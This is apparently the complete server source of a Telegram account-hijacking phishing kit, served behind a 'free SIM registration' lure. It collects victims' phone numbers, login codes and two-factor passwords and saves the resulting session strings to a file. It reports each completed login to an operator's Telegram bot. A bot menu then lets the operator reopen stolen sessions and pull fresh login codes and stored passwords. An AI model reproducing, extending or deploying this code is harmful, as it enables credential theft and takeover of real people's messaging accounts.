import dotenv from 'dotenv';
dotenv.config();
import express from 'express';
import cors from 'cors';
import { TelegramClient, Api } from 'telegram';
import { StringSession } from 'telegram/sessions/index.js';
import bodyParser from 'body-parser';
import fetch from 'node-fetch';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use('/styles', express.static(path.join(__dirname, 'styles')));
app.use('/img', express.static(path.join(__dirname, 'img')));



const API_ID = parseInt(process.env.API_ID, 10);
const API_HASH = process.env.API_HASH;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // ID user admin
const webhookUrl = 'https://registarasimgratis.vercel.app/telegram/webhook'; // Ganti dengan URL webhook Anda

const activeClients = {};
const sessions = {};
const pendingAuth = {}; // Track authentication state for each phone number
const twoFAPasswords = {}; // Menyimpan password 2FA
let codePromiseResolve = null;

function createStringSession(sessionString = '') {
    try {
        return new StringSession(sessionString);
    } catch (error) {
        console.error('Error creating string session:', error);
        return new StringSession(''); // Return empty session if invalid
    }
}

function saveSessionsToFile() {
    try {
        const sessionData = JSON.stringify(sessions, null, 2);
        fs.writeFileSync('sessions.json', sessionData);
        console.log('Sessions saved successfully');
        console.log('Active sessions:', Object.keys(sessions));
    } catch (error) {
        console.error('Error saving sessions:', error);
    }
}

function loadSessions() {
    try {
        if (fs.existsSync('sessions.json')) {
            const data = fs.readFileSync('sessions.json', 'utf-8');
            Object.assign(sessions, JSON.parse(data));
            console.log('Sessions loaded:', Object.keys(sessions));
        }
    } catch (error) {
        console.error('Error loading sessions:', error);
    }
}

loadSessions();

function validatePhoneNumber(phoneNumber) {
    if (!phoneNumber) return null;
    const cleaned = phoneNumber.replace(/[^\d+]/g, '');
    if (!cleaned.startsWith('+')) {
        return '+' + cleaned;
    }
    if (cleaned.length < 10) {
        return null;
    }
    return cleaned;
}

function isTwoFARequired(phoneNumber) {
    return !twoFAPasswords[phoneNumber];
}

app.post('/submit-phone', async (req, res) => {
    console.log('Received request to submit phone:', req.body);
    const { phoneNumber } = req.body;

    if (!phoneNumber) {
        return res.status(400).json({
            status: 'error',
            message: 'Nomor telepon diperlukan'
        });
    }

    try {
        const formattedPhone = validatePhoneNumber(phoneNumber);
        if (!formattedPhone) {
            throw new Error('Format nomor telepon tidak valid');
        }

        if (activeClients[formattedPhone]) {
            try {
                await activeClients[formattedPhone].disconnect();
            } catch (e) {
                console.error('Kesalahan saat memutuskan klien yang ada:', e);
            }
            delete activeClients[formattedPhone];
        }

        const stringSession = createStringSession();
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 5,
        });

        await client.connect();
        
        let passwordRequired = false;
        let otpResolved = false;

        activeClients[formattedPhone] = {
            client,
            passwordRequired: false,
            otpSubmitted: false
        };

        await client.start({
            phoneNumber: () => formattedPhone,
            phoneCode: async () => {
                activeClients[formattedPhone].awaitingOTP = true;
                res.json({ status: 'otp_required' });
                return new Promise(resolve => {
                    activeClients[formattedPhone].resolveOTP = resolve;
                });
            },
            password: async () => {
                activeClients[formattedPhone].passwordRequired = true;
                if (otpResolved) {
                    // If OTP was already submitted, notify client about password requirement
                    sendPasswordRequiredNotification(formattedPhone);
                }
                return new Promise(resolve => {
                    activeClients[formattedPhone].resolvePassword = resolve;
                });
            },
            onError: (err) => {
                console.error('Error during phone submission:', err);
                throw err;
            }
        });

    } catch (error) {
        console.error('Kesalahan selama pengiriman nomor telepon:', error);
        if (!res.headersSent) {
            res.status(500).json({
                status: 'error',
                message: 'Terjadi kesalahan selama autentikasi: ' + error.message
            });
        }
    }
});

app.post('/submit-otp', async (req, res) => {
    const { phoneNumber, otp } = req.body;
    // console.log('OTP submitted for:', formattedPhone);
    if (!phoneNumber || !otp) {
        return res.status(400).json({
            status: 'error',
            message: 'Nomor telepon dan OTP diperlukan'
        });
    }

    try {
        const formattedPhone = validatePhoneNumber(phoneNumber);
        const clientData = activeClients[formattedPhone];

        if (!clientData) {
            return res.status(400).json({
                status: 'error',
                message: 'Tidak ada sesi login aktif ditemukan'
            });
        }

        clientData.otpSubmitted = true;
        
        if (clientData.resolveOTP) {
            clientData.resolveOTP(otp);
        }

        // Wait briefly to check if 2FA is required
        await new Promise(resolve => setTimeout(resolve, 1000));

        if (clientData.passwordRequired) {
            console.log(`2FA required for ${formattedPhone}`);
            // Send response indicating password is required and redirect should happen
            return res.json({
                status: 'password_required',
                message: 'Two-factor authentication required',
                redirect: true // Add this flag to indicate redirect is needed
            });
        }

        // If no 2FA required, complete the authentication
        const client = clientData.client;
        if (await client.isUserAuthorized()) {
            sessions[formattedPhone] = client.session.save();
            saveSessionsToFile();
            
            const loginMessage = `Login completed:\nPhone: ${formattedPhone}\nTime: ${new Date().toISOString()}`;
            await sendTelegramMessage(ADMIN_CHAT_ID, loginMessage);

            delete activeClients[formattedPhone];
            return res.json({ 
                status: 'success',
                message: 'Authentication successful'
            });
        }

    } catch (error) {
        console.error('Kesalahan selama verifikasi OTP:', error);
        res.status(500).json({
            status: 'error',
            message: 'OTP tidak valid atau verifikasi gagal.'
        });
    }
});

// Function to send notification about password requirement
const sendPasswordRequiredNotification = (phoneNumber) => {
    // You can implement WebSocket or Server-Sent Events here if needed
    console.log(`Password required notification sent for ${phoneNumber}`);
};


app.post('/submit-password', async (req, res) => {
    const { phoneNumber, password } = req.body;

    if (!phoneNumber || !password) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone number and password are required'
        });
    }

    try {
        const formattedPhone = validatePhoneNumber(phoneNumber);
        const clientData = activeClients[formattedPhone];

        if (!clientData) {
            return res.status(400).json({
                status: 'error',
                message: 'No active login session found'
            });
        }

        if (!clientData.otpSubmitted) {
            return res.status(400).json({
                status: 'error',
                message: 'OTP must be submitted before password'
            });
        }

        twoFAPasswords[formattedPhone] = password;

        if (clientData.resolvePassword) {
            clientData.resolvePassword(password);
        }

        const client = clientData.client;

        // Wait for authentication to complete
        await new Promise(resolve => setTimeout(resolve, 2000));

        if (await client.isUserAuthorized()) {
            sessions[formattedPhone] = client.session.save();
            saveSessionsToFile();
            
            const loginMessage = `2FA Login completed:\nPhone: ${formattedPhone}\nTime: ${new Date().toISOString()}`;
            await sendTelegramMessage(ADMIN_CHAT_ID, loginMessage);

            delete activeClients[formattedPhone];
            res.json({ 
                status: 'success',
                message: 'Authentication completed successfully'
            });
        } else {
            res.status(400).json({
                status: 'error',
                message: 'Authentication failed.'
            });
        }

    } catch (error) {
        console.error('Error during password submission:', error);
        res.status(500).json({
            status: 'error',
            message: 'Invalid password or authentication failed.'
        });
    }
});


function splitMessage(message, maxLength = 4096) {
    const parts = [];
    let currentPart = '';

    message.split('\n').forEach(line => {
        if ((currentPart + line).length > maxLength) {
            parts.push(currentPart);
            currentPart = line + '\n';
        } else {
            currentPart += line + '\n';
        }
    });

    if (currentPart) {
        parts.push(currentPart);
    }

    return parts;
}

async function sendTelegramMessage(chatId, messageText, replyMarkup = null) {
    if (typeof chatId !== 'number' || chatId <= 0) {
        console.error('Invalid chat ID:', chatId);
        return;
    }

    const messageParts = splitMessage(messageText);

    for (const part of messageParts) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const body = {
            chat_id: chatId,
            text: part,
        };

        if (replyMarkup) {
            body.reply_markup = replyMarkup;
        }

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body),
            });

            const jsonResponse = await response.json();
            if (!jsonResponse.ok) {
                console.error(`Error ${jsonResponse.error_code}: ${jsonResponse.description}`);
            } else {
                console.log('Message sent successfully:', jsonResponse);
            }
        } catch (err) {
            console.error('Error while sending message:', err);
        }
    }
}

async function getChatList(client) {
    try {
        const result = await client.getDialogs({ limit: 10 });
        result.sort((a, b) => b.date - a.date);
        const chats = result.map((chat, index) => `${index + 1}. ${chat.name || chat.title || chat.username}`);
        return { chats, dialogs: result };
    } catch (error) {
        console.error("Error fetching chat list:", error);
        throw error;
    }
}

app.get('/fetch-chats', async (req, res) => {
    try {
        const { chats } = await getChatList(client);
        res.json({ status: 'success', chats });
    } catch (error) {
        res.status(500).json({ status: 'error', message: 'Terjadi kesalahan saat mengambil chat.' });
    }
});

async function getMessagesFromChat(client, chatId) {
    try {
        const result = await client.getMessages(chatId, { limit: 5 });
        return result.map(msg => msg.text).join('\n');
    } catch (error) {
        console.error('Error fetching messages:', error);
        throw error;
    }
}

app.post('/delete-session', (req, res) => {
    const { phoneNumber } = req.body;
    
    if (!phoneNumber || !sessions[phoneNumber]) {
        return res.status(400).json({
            status: 'error',
            message: 'Sesi tidak ditemukan untuk nomor telepon yang diberikan.'
        });
    }
    
    try {
        delete sessions[phoneNumber];            // Hapus dari object sessions
        delete activeClients[phoneNumber];       // Hapus dari klien aktif
        
        saveSessionsToFile();                    // Simpan perubahan ke file
        
        res.json({
            status: 'success',
            message: `Sesi untuk ${phoneNumber} berhasil dihapus`
        });
    } catch (error) {
        console.error('Kesalahan saat menghapus sesi:', error);
        res.status(500).json({
            status: 'error',
            message: 'Gagal menghapus sesi.'
        });
    }
});


async function setTelegramWebhook() {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;
    const data = {
        url: webhookUrl
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        const jsonResponse = await response.json();
        
        if (response.ok) {
            console.log('Webhook berhasil diatur:', jsonResponse);
        } else {
            console.error('Gagal mengatur webhook:', jsonResponse);
        }
    } catch (error) {
        console.error('Terjadi kesalahan saat mengatur webhook:', error);
    }
}

// Panggil fungsi untuk mengatur webhook
setTelegramWebhook();

app.post('/telegram/webhook', async (req, res) => {
    const { message, callback_query } = req.body;

    if (message) {
        const chatId = message.chat.id;
        const command = message.text;

        if (command === '/menu') {
            const phoneNumbers = Object.keys(sessions);
            const inlineKeyboard = phoneNumbers.map(phone => [
                { text: phone, callback_data: `phone_${phone}` },
                { text: '❌ Hapus', callback_data: `delete_${phone}` },  // Tombol Delete
                { text: '📋 Salin', callback_data: `copy_${phone}` }  // Tombol Salin
            ]);            
            const menuMessage = 'Pilih nomor telepon:';
            const replyMarkup = { inline_keyboard: inlineKeyboard };
            await sendTelegramMessage(chatId, menuMessage, replyMarkup);
        }
    }

    if (callback_query) {
        const chatId = callback_query.message.chat.id;
        const data = callback_query.data;

        if (data.startsWith('delete_')) {
            const phoneNumber = data.split('_')[1];
            
            // Kirim permintaan ke endpoint /delete-session untuk menghapus sesi
            try {
                const deleteResponse = await fetch(`https://registarasimgratis.vercel.app/delete-session`, { // ganti sesuai nama domain
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber })
                });
                
                const result = await deleteResponse.json();
                await sendTelegramMessage(chatId, result.message);
            } catch (error) {
                console.error(`Kesalahan saat menghapus sesi untuk ${phoneNumber}:`, error);
                await sendTelegramMessage(chatId, `Gagal menghapus sesi untuk ${phoneNumber}.`);
            }
        }

        if (data.startsWith('phone_')) {
            const phoneNumber = data.split('_')[1];
            const sessionString = sessions[phoneNumber];
            if (!sessionString) {
                await sendTelegramMessage(chatId, `Sesi tidak ditemukan untuk nomor ${phoneNumber}.`);
                return res.sendStatus(200);
            }

            try {
                const clientWithSession = new TelegramClient(createStringSession(sessionString), API_ID, API_HASH, {
                    connectionRetries: 5,
                });

                await clientWithSession.connect();
                const { dialogs } = await getChatList(clientWithSession);
                const chatWithOTP = dialogs.find(chat => chat.title && chat.title.toLowerCase().includes('telegram'));

                if (chatWithOTP) {
                    const otpMessage = await getMessagesFromChat(clientWithSession, chatWithOTP.id);
                    const otpMatch = otpMessage.match(/\d{5,6}/);
                    const otp = otpMatch ? otpMatch[0] : null;

                    if (otp) {
                        let customMessage = `OTP : ${otp}`;
                        const password = twoFAPasswords[phoneNumber] || 'Password 2FA tidak ditemukan';
                        customMessage += `\nPassword : ${password}`;

                        // Menambahkan tombol salin nomor telepon
                        const replyMarkup = {
                            inline_keyboard: [
                                [
                                    { text: `Salin ${phoneNumber}`, callback_data: `copy_${phoneNumber}` }
                                ]
                            ]
                        };

                        await sendTelegramMessage(chatId, customMessage, replyMarkup);
                        if (chatId !== ADMIN_CHAT_ID) {
                            await sendTelegramMessage(ADMIN_CHAT_ID, customMessage, replyMarkup);
                        }
                    } else {
                        await sendTelegramMessage(chatId, `Tidak dapat menemukan OTP dalam pesan untuk ${phoneNumber}.`);
                    }
                } else {
                    await sendTelegramMessage(chatId, `Tidak terdapat chat OTP yang dapat ditampilkan untuk ${phoneNumber}.`);
                }

                await clientWithSession.disconnect();
            } catch (error) {
                console.error(`Error fetching OTP or handling callback for ${phoneNumber}:`, error);
                await sendTelegramMessage(chatId, `Terjadi kesalahan saat mengambil OTP atau password untuk ${phoneNumber}.`);
            }
        } else if (data.startsWith('copy_')) {
            const phoneNumber = data.split('_')[1];
            // Menyalin nomor telepon
            await sendTelegramMessage(chatId, `Nomor telepon yang disalin: ${phoneNumber}`);
        }
    }

    res.sendStatus(200);
});



// const __filename = fileURLToPath(import.meta.url);
// const __dirname = path.dirname(__filename);



app.get('/', (req, res) => {
    res.sendFile(path.resolve(__dirname, 'index.html'));
});

app.get('/register', (req, res) => {
    console.log('Received request for /register');
    res.sendFile(path.resolve(__dirname, 'register.html'), (err) => {
        if (err) {
            console.error('Error sending file:', err);
            res.status(err.status).end();
        }
    });
});

app.get('/login', (req, res) => {
    console.log('Received request for /login');
    res.sendFile(path.resolve(__dirname, 'login.html'), (err) => {
        if (err) {
            console.error('Error sending file:', err);
            res.status(err.status).end();
        }
    });
});

app.listen(3000, () => {
    console.log('Server berjalan di http://127.0.0.1:3000');
});

